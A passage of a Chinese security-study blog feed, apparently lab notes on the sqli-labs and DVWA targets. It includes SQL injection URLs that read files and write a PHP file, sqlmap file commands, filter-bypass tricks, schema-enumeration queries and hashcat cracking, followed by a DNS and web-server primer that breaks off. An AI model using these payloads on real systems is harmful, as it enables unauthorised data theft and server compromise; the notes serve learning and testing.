(&#39;39&#39;,&#39;less39&#39;,&#39;hello&#39;)--+</span><br></pre></td></tr></table></figure><h1 id="Mysql注入读写文件"><a href="#Mysql注入读写文件" class="headerlink" title="Mysql注入读写文件"></a>Mysql注入读写文件</h1><p>1.读文件（<a href="http://www.cnblogs.com/lcamry/p/5729087.html">MySQL注入load_file常用路径</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&#39;D:\\1.txt&#39;)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130215923264.png" alt="image-20201130215923264"></p><p>2.写文件（写webshell到网站目录）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;-1&#39;)) union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;E:\\web\\apache\\htdocs\\1.php&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130222727784.png" alt="image-20201130222727784"></p><p><strong>利用Sqlmap读写文件</strong></p><p>–file-read “路径”</p><p>–file-write “要写入的内容或所在文件路径” –file-dest “要写入的路径”</p><p>1.读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-read &quot;D:\\1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130224238087.png" alt="image-20201130224238087"></p><p>2.写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-write &quot;E:\\1.txt&quot; --file-dest &quot;E:\\2.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="SQL注入绕过手段"><a href="#SQL注入绕过手段" class="headerlink" title="SQL注入绕过手段"></a>SQL注入绕过手段</h1><p><strong>1.大小写绕过</strong></p><p>例如：如果过滤了order，可以使用OrdER来进行绕过</p><p><strong>2.双写绕过</strong></p><p>例如：如果过滤了union，发现union无论大小写都会被替换为空，可以使用UniunionOn</p><p><strong>3.编码绕过</strong></p><p>可以利用URL编码，绕过过滤机制</p><p>如，union%250cselect </p><p><strong>4.内联注释绕过</strong></p><p>内联注释里的内容会被当成SQL语句执行，例如/*!select */</p><p><strong>5.绕过去除注释符的SQL注入</strong></p><p>–+，– ，# ，等注释符被过滤失效，考虑其他方式，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;1&#39; or (extractvalue(1,concat(0x7e,(payload)))) or &#39;</span><br></pre></td></tr></table></figure><p><strong>6.绕过过滤and和or的SQL注入</strong></p><p>大小写变形，Or，oR，And，aND等</p><p>添加注释，a/**/nd</p><p>双写绕过，oorr</p><p>利用符号替代，and–&amp;&amp;,or–||</p><p><strong>7.绕过空格过滤</strong></p><p>可使用以下代替空格</p><p>%09  TAB 键（水平）</p><p>%0b  TAB 键（垂直）</p><p>%0a  新建一行</p><p>%0c  新的一页</p><p>%0d  return 功能</p><p>%a0  空格</p><p>/* xxx*/  代替空格(利用fuzz得出xxx)</p><p>或语句间用括号，如 select(1)from(admin)where(length(passwd))=32</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] <a href="https://blog.csdn.net/DarkHQ/article/details/79274376">mysql盲注（基于时间）</a></p><p>[2] <a href="https://www.cnblogs.com/csyxf/p/10241456.html">Mysql报错型注入总结</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">MYSQL POST型注入详解</a></p><p>[4] <a href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p><p>[5] <a href="https://blog.csdn.net/helloc0de/article/details/76180190">SQL注入教程——（四）宽字节注入</a></p><p>[6] <a href="https://blog.csdn.net/qq_26406447/article/details/90643951">SQL Injection8(堆叠注入)——强网杯2019随便注</a></p><p>[7] <a href="https://blog.csdn.net/weixin_44032232/article/details/109262724">【渗透测试】DNSLog注入</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL默认库及读写文件</title>
      <link href="posts/36028.html"/>
      <url>posts/36028.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL默认库"><a href="#MySQL默认库" class="headerlink" title="MySQL默认库"></a>MySQL默认库</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ReAX6wu7mGhDbzE.png" alt="image-20201101161119257"></p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，字段类型与访问权 限等。</p><p>查询数据库、表名、字段等信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 爆所有用户</span><br><span class="line">select group_concat(user) from mysql.user;</span><br><span class="line"> </span><br><span class="line"># 爆所有数据库</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.schemata;</span><br><span class="line"> </span><br><span class="line"># 爆当前数据库的表名</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># 表中有主码约束，非空约束等完整性约束条件的情况下 爆表名</span><br><span class="line">select group_concat(table_name) from information_schema.table_constraints where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># 爆字段名(表名是 users，加引号或十六进制编码)</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273;</span><br><span class="line"> </span><br><span class="line"># 爆字段内容</span><br><span class="line">select first_name,password from users；</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>这个是mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。</p><h2 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h2><p>MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。并且库里表的存储引擎PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>Sys库所有的数据源来自：performance_schema。目标是把performance_schema的把复杂度降低，让DBA能更好的阅读这个库里的内容，让DBA更快的了解DB的运行情况。（<a href="https://blog.csdn.net/jayewu/article/details/80183274">详情</a>）</p><h1 id="利用数据库的功能读写文件"><a href="#利用数据库的功能读写文件" class="headerlink" title="利用数据库的功能读写文件"></a>利用数据库的功能读写文件</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>（1）数据库允许导入导出（secure_file_priv不为NULL）</p><p>查看数据库是否开启导入导出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure_file_priv&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cHQ8D7LdrBCN3Ea.png" alt="image-20201113225818984"></p><p>   说明：secure_file_priv是用来限制load_file、load data和select  outfile操作哪个指定目录。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yRk6KT1us85Jfhc.png" alt="img"></p><p>我这里默认是 <strong>/var/lib/mysql-files</strong> ,可以通过以下方式修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>在最后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure file priv&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>重启mysql服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>（2）当前用户的文件操作权限（File_priv：Y）</p><p>​     查看当前用户是否具有文件读写权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host &#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rQJSMWpgFqEn2P4.png" alt="image-20201113230842289"></p><h2 id="读文件（mysql导入数据）"><a href="#读文件（mysql导入数据）" class="headerlink" title="读文件（mysql导入数据）"></a>读文件（mysql导入数据）</h2><p><strong>(1)load_file()</strong></p><p><strong>(2)load data infile()</strong></p><p><strong>(3)system cat</strong></p><p>load_file()和load data infile读取文件的方法为:新建一个表，读取文件为字符串形式插入表中，然后读出表中数据。</p><p>system cat后加文件路径。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U3DF2m1LXbCo7Zt.png" alt="image-20201113233615626"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZAuskmMVWpbHn75.png" alt="image-20201113234015997"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201113234210769.png" alt="image-20201113234210769"></p><h2 id="写文件-mysql导出数据"><a href="#写文件-mysql导出数据" class="headerlink" title="写文件  (mysql导出数据)"></a>写文件  (mysql导出数据)</h2><p><strong>select ‘   ‘ into outfile</strong> </p><p>如：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lCJvISb6Pezq8oE.png" alt="image-20201113234946913"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yZDH4EV6ABao7OL.png" alt="image-20201113235046444"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HZCNgiT9StwEM61.png" alt="image-20201114184126130"></p><h1 id="hash相关"><a href="#hash相关" class="headerlink" title="hash相关"></a>hash相关</h1><h2 id="查询用户hash"><a href="#查询用户hash" class="headerlink" title="查询用户hash"></a>查询用户hash</h2><p>目标：dvwa的admin用户的password</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/x9OkDFblViRWqjU.png" alt="image-20201115110152189"></p><p><a href="https://www.cmd5.com/">破解</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2kzlbPJABgNnKGW.png" alt="image-20201115110328511"></p><h2 id="使用-hashcat-来对获取的-hash-进行暴力破解"><a href="#使用-hashcat-来对获取的-hash-进行暴力破解" class="headerlink" title="使用 hashcat 来对获取的 hash 进行暴力破解"></a>使用 hashcat 来对获取的 hash 进行暴力破解</h2><p><a href="https://hashcat.net/hashcat/">下载hashcat</a></p><p>在hashcat文件夹新建</p><p>hash.txt(保存要破解的hash值)</p><p>password.txt(保存密码字典)</p><p>使用cmd进入hashcat所在目录,用以下命令进行破解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 hash.txt password.txt</span><br></pre></td></tr></table></figure><p>-a 0 代表使用字典破解模式</p><p>-m 0 代表Hash Type为md5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/V2fysUPHAidRWc4.png" alt="image-20201115113529889"></p><p>结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yW5AYkZS4PwIJmu.png" alt="image-20201115113724632"></p><p>破解记录在hashcat.potfile文件中可查</p><p>或可直接<strong>使用字典进行破解</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 5f4dcc3b5aa765d61d8327deb882cf99 password.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SJh5OiLlT92MH7X.png" alt="image-20201115114500987"></p><p>结果一致。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_33991418/article/details/89744955">安装初始化mysql后，默认几个库介绍</a></p><p>[2] <a href="https://blog.csdn.net/WYJ____/article/details/81234382?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SQL注入读写文件</a></p><p>[3] <a href="https://blog.csdn.net/qq_34981272/article/details/99337529">数据库系统表相关学习</a></p><p>[4] <a href="https://blog.csdn.net/smli_ng/article/details/106111493">hashcat详细使用教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web页面解析流程的学习</title>
      <link href="posts/671.html"/>
      <url>posts/671.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>WEB 页面解析的总体流程</p><p>客户端（浏览器）发起页面请求，主机对 地址中的DNS 域名进行解析，找到对应的 IP 地址，请求发送到 服务端，服务器根据请求内容发送响应给客户端，客户端收到响应，将内容渲染成网页。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181119855.png" alt="image-20201222181119855"></p><h1 id="域名解析的过程"><a href="#域名解析的过程" class="headerlink" title="域名解析的过程"></a>域名解析的过程</h1><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>(1) <strong>域名</strong>：网络是基于TCP/IP协议进行通信和连接的，每一台主机都有唯一且固定的IP地址，从而区分因特网上数量庞大的主机。IP地址是数字型的，数字较多不方便记忆，于是人们又发明了域名地址，采用字符型结构。域名地址是域的自然语言名称，它与数字式IP地址存在一一对应的关系。IP地址如同电脑的身份证号码，而域名地址则相当于电脑的姓名，方便人们记忆和使用。域名一般由两个或两个以上的词构成，中间用“.”进行分隔，其结构是：四级域名.三级域名.二级域名.一级域名。</p><p>(2) <strong>DNS</strong>：<strong>域名系统</strong>（英语：<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem，缩写：<strong>DNS</strong>）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p><strong>DNS 服务器的分层结构</strong></p><p>DNS 服务器采用分布式、分层的方式部署在世界各地。按照层级从高到低，DNS 服务器分为：<code>根域名服务器</code>（Root DNS Servers）、<code>顶级域名服务器</code>（TLD DNS Servers）、<code>权威域名服务器</code>（Authoritative DNS Servers），层级关系如下图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181259372.png" alt="image-20201222181259372"></p><ul><li><code>根域名服务器</code>：世界上有 13 个 <code>根域名服务器</code>，准确来说是 13 组服务器群组，服务器组中的每一个<code>根域名服务器</code>都有所有<code>顶级域名服务器</code>（com, org, gov …）的 IP 地址。</li><li><code>顶级域名服务器</code>：为顶级域名如 com、org、net 等提供域名解析服务，每一个顶级域名都有相应的 <code>顶级域名服务器</code>，存放其所有子域名的 IP 地址。</li><li><code>权威域名服务器</code>：各种组织机构，如企业、学校、政府组织等都需为其提供网络服务的主机取一个合适的域名，如 百度公司的 baidu.com，而主机的 IP 地址和域名的对应关系就保存至其<code>权威域名服务器</code>中。一般大公司和学校都会部署自己的<code>权威域名服务器</code>。</li></ul><p>(3) <strong>域名解析</strong>：即域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。DNS查询有两种方式：<strong>递归</strong>和<strong>迭代</strong>。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。</p><p><strong>递归查询</strong>：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><p><strong>迭代查询</strong>：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><h2 id="流程介绍"><a href="#流程介绍" class="headerlink" title="流程介绍"></a>流程介绍</h2><p>(1) <strong>浏览器输入域名之后，首先会检查浏览器缓存中是否缓存过该域名对应的IP地址</strong></p><p>用户通过浏览器浏览过某网站之后，浏览器就会自动缓存该网站域名对应的地址，当用户再次访问的时候，浏览器就会从缓存中查找该域名对应的IP地址，因为缓存不仅是有大小限制，而且还有时间限制（域名被缓存的时间通过属性来设置），所以存在域名对应的找不到的情况。当浏览器从缓存中找到了该网站域名对应的地址，那么整个解析过程结束，如果没有找到，将进行下一步骤。对于的缓存时间问题，不宜设置太长的缓存时间，时间太长，如果域名对应的发生变化，那么用户将在一段时间内无法正常访问到网站，如果太短，那么又造成频繁解析域名。</p><p>(2) <strong>如果在浏览器缓存中没有找到IP，那么将继续查找本机系统是否缓存过IP</strong></p><p>如果第一个步骤没有完成对域名的解析过程，那么浏览器会去系统缓存中查找系统是否缓存过这个域名对应的地址。其实操作系统也有一个域名解析的过程，通过<strong>hosts文件</strong>设置，用户可以将任何域名解析到任何能够访问的IP地址。正是因为有这种本地DNS解析的规程，所以有黑客就可能通过修改用户的域名来把特定的域名解析到他指定的IP地址上，导致这些域名被劫持。</p><p>(3) <strong>向本地域名解析服务系统发起域名解析的请求</strong></p><p>以上两步的解析是在本机上完成的，如果本机无法解析域名，那么系统只能请求本地域名解析服务系统进行解析，本地域名系统一般都是本地区的域名服务器，比如你连接的校园网，那么域名解析系统就在你的校园机房里，如果你连接的是电信、移动或者联通的网络，那么本地域名解析服务器就在本地区，由各自的运营商来提供服务。对于本地域名解析服务器，一般都缓存了地区内部域名解析请求的结果，如果缓存命中则返回相应的结果，当然缓存时间也受域名失效时间控制。大约80%的域名解析到这里就结束了，所以本地域名解析系统主要承担了域名的解析工作。</p><p>(4) <strong>向根域名解析服务器发起域名解析请求</strong></p><p>如果本地域名解析系统的缓存中没有所需要查找到域名，则将会向根域名服务器发起解析请求。</p><p>(5) <strong>根域名服务器返回给本地域名服务器一个所查询的主域名服务器（gTLD Server）地址</strong></p><p>根域名是不负责解析域名的，它只负责管理所有的顶级域名。比如：你要解析的网址是：<em><a href="http://www.xxx.com/">www.xxx.com</a></em>，根域名服务器是不知道这个域名的IP地址的，但是它知道这个IP在它管理的<code>.com</code>域名下，根域名服务器会向请求方发送<code>.com</code>域名服务器的地址，引导请求方继续查询。</p><p>(6) <strong>本地域名服务器LDNS再向上一步返回的gTLD服务器发送请求</strong></p><p>因为域名服务器之间会有大量的数据需要处理，所以DNS服务器之间一般采用迭代查询方式。本地域名解析服务器向gTLD服务器发起请求。</p><p>(7) <strong>gTLD服务器接收请求并返回Name Server服务器</strong></p><p>指定的域名由指定的Name Server服务器进行解析。</p><p>(8) <strong>Name Server服务器返回IP地址给本地服务器</strong></p><p>服务器查找域名对应的地址，将地址连同值返回给本地域名服务器。</p><p>(9) <strong>本地域名服务器缓存解析结果</strong></p><p>本地域名服务器缓存解析后的结果，缓存时间由TTL值控制。</p><p>(10) <strong>返回解析结果给用户</strong></p><p>解析结果将直接返回给用户，用户系统将缓存该地址，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。</p><h2 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h2><ul><li><p>A(Address)记录：用来指定主机名（或域名）对应的IP地址记录。</p></li><li><p>CNAME(别名)记录：即别名记录。这种记录允许您将多个名字映射到另外一个域名。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就 <a href="http://www.mydomain.com/%E5%92%8C%E2%80%9Cmail.mydomain.com%E2%80%9D%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%8C%87%E5%90%91">http://www.mydomain.com/和“mail.mydomain.com”。实际上他们都指向</a> “host.mydomain.com”。</p></li><li><p>MX 记录： 邮件交换记录。它指向⼀个邮件服务器，⽤于电⼦邮件系统发邮<br>件时根据 收信⼈的地址后缀来定位邮件服务器。如：用户所用的邮件是以域名mydomain.com为结尾的，则需要在管理界面中添加该域名的MX记录来处理所有以@mydomain.com结尾的邮件。</p></li><li><p>NS(Name Server)记录：解析服务器记录。⽤来表明由哪台服务器对该域名进⾏解析。这⾥的NS<br>记录只对⼦域名⽣效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。 　　</p></li><li><p>TXT记录：⼀般指为某个主机名或域名设置的说明</p></li></ul><h1 id="web-页面请求的流程"><a href="#web-页面请求的流程" class="headerlink" title="web 页面请求的流程"></a>web 页面请求的流程</h1><h2 id="Web中间件"><a href="#Web中间件" class="headerlink" title="Web中间件"></a>Web中间件</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx 性能稳定、功能丰富、运维简单、处理静态文件速度快且消耗系统资源极少。<br>1、相比 Apache，用 Nginx 作为 Web 服务器：使用资源更少，支持更多并发连接，效率更高。<br>2、作为负载均衡服务器：Nginx 既可在内部直接支持 Rails 和 PHP，也可支持作为 HTTP 代理服务器对外进行服务。Nginx 用 C 编写而成， 不论是系统资源开销还是 CPU 使用效率都比 Perlbal 要好的多。<br>3、作为邮件代理服务器：Nginx 同时也是一款非常优秀的邮件代理服务器（最早开发这个产品的目的之一，是作为邮件代理服务器）。</p><p>4、反向代理可以根据url将请求转向于不同用途的集群，比如图片请求，转向图片服务器集群；视频请求，转身视频服务器集群。</p><p>nginx是一款轻量级的web服务器/反向代理服务器/电子邮件代理服务器，安装非常简单，配置文件也很简洁（还支持 perl 语法）。Nginx 支持平滑加载新配置，还能够在不间断服务的情况下进行软件版本升级。</p><p><strong>#代理</strong></p><p>在Java设计模式中，代理模式是这样定义的：给某个对象提供一个代理对象，并由代理对象控制原对象的引用。</p><p>可能大家不太明白这句话，在举一个现实生活中的例子：比如我们要买一间二手房，虽然我们可以自己去找房源，但是这太花费时间精力了，而且房屋质量检测以及房屋过户等一系列手续也都得我们去办，再说现在这个社会，等我们找到房源，说不定房子都已经涨价了，那么怎么办呢？最简单快捷的方法就是找二手房中介公司（为什么？别人那里房源多啊），于是我们就委托中介公司来给我找合适的房子，以及后续的质量检测过户等操作，我们只需要选好自己想要的房子，然后交钱就行了。</p><p>代理简单来说，就是如果我们想做什么，但又不想直接去做，那么这时候就找另外一个人帮我们去做。那么这个例子里面的中介公司就是给我们做代理服务的，我们委托中介公司帮我们找房子。</p><ul><li><strong>正向代理</strong></li></ul><p>弄清楚什么是代理了，那么什么又是正向代理呢？</p><p>这里我再举一个例子：大家都知道，现在国内是访问不了 Google的，那么怎么才能访问 Google呢？我们又想，美国人不是能访问 Google吗（这不废话，Google就是美国的），如果我们电脑的对外公网 IP 地址能变成美国的 IP 地址，那不就可以访问 Google了。你很聪明，VPN 就是这样产生的。我们在访问 Google 时，先连上 VPN 服务器将我们的 IP 地址变成美国的 IP 地址，然后就可以顺利的访问了。</p><p>这里的 VPN 就是做正向代理的。正向代理服务器位于客户端和服务器之间，为了向服务器获取数据，客户端要向代理服务器发送一个请求，并指定目标服务器，代理服务器将目标服务器返回的数据转交给客户端。这里客户端是要进行一些正向代理的设置的。</p><ul><li><strong>反向代理</strong></li></ul><p>反向代理和正向代理的区别就是：<strong>正向代理代理客户端，反向代理代理服务器。</strong></p><p>反向代理，其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p><p>下面我们通过两张图来对比正向代理和方向代理：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx2.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx3.png"></p><p>理解这两种代理的关键在于代理服务器所代理的对象是什么，正向代理代理的是客户端，我们需要在客户端进行一些代理的设置。而反向代理代理的是服务器，作为客户端的我们是无法感知到服务器的真实存在的。</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>1、Apache 是 LAMP 架构最核心的 Web Server，开源、稳定、模块丰富是 Apache 的优势。但 Apache 的缺点是有些臃肿，内存和 CPU 开销大，性能上有损耗，不如一些轻量级的 Web 服务器（譬如：Nginx、Tengine等）高效，轻量级的 Web 服务器对于静态文件的响应能力来说远高于 Apache 服务器。</p><p>2、Apache 做为 Web Server 是负载 PHP 的最佳选择，如果流量很大的话，可以采用 Nginx 来负载非 PHP 的 Web 请求。Nginx 是一个高性能的 HTTP 和反向代理服务器，Nginx 以其稳定、丰富功能集、示例配置文件和低系统资源的消耗而闻名。Nginx 现能支持 PHP 和 FastCGI，也支持负载均衡和容错，可和 Apache 配合使用，是轻量级的 HTTP 服务器的首选。</p><p>3、Web 服务器缓存也有多种方案，Apache 提供了自己的缓存模块，也可以使用外加的 Squid 模块进行缓存，这两种方式均可有效提高 Apache 的访问响应能力。Squid Cache 是一个 Web 缓存服务器，支持高效缓存，可作为网页服务器的前置 cache 服务器缓存相关请求以提高 Web 服务器速度。把 Squid 放在 Apache 的前端来缓存 Web 服务器生成动态内容，而 Web 应用程序只需要适当地设置页面实效时间即可。如访问量巨大，则可考虑使用 memcache 作为分布式缓存。</p><p>4、PHP 的加速可使用 eAccelerator 加速器，eAccelerator 是一个自由开放源码的 PHP 加速器。它会优化动态内容缓存，提高 PHP 脚本缓存性能，使 PHP 脚本在编译状态下，对服务器的开销几乎完全消除。它还可对脚本起优化作用，以加快其执行效率。 使 PHP 程序代码执效率可提高 1-10 倍。</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>IIS</strong>是<strong>Internet</strong> <strong>Information</strong> <strong>Services</strong>的缩写，意为互联网信息服务，是由微软公司提供的基于 运行<strong>Microsoft</strong> <strong>Windows</strong>的互联网基本服务。 最初是<strong>Windows</strong> <strong>NT</strong>版本的可选包，随后内置在<strong>Windows</strong> 2000、<strong>Windows</strong> <strong>XP</strong> <strong>Professional</strong>和 <strong>Windows</strong> <strong>Server</strong> 2003一起发行，但在<strong>Windows</strong> <strong>XP</strong> <strong>Home</strong>版本上并没有<strong>IIS</strong>。 <strong>IIS</strong>是一种<strong>Web</strong>（网页）服务组件，其中包括<strong>Web</strong>服务器、<strong>FTP</strong>服务器、<strong>NNTP</strong>服务器和<strong>SMTP</strong>服务器， 分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网） 上发布信息成了一件很容易的事。 <strong>IIS</strong>最经典的版本是<strong>IIS6</strong>.0，最常见于<strong>Windows</strong> <strong>Server</strong> 2003系统中；<strong>IIS7</strong>.0则常见于 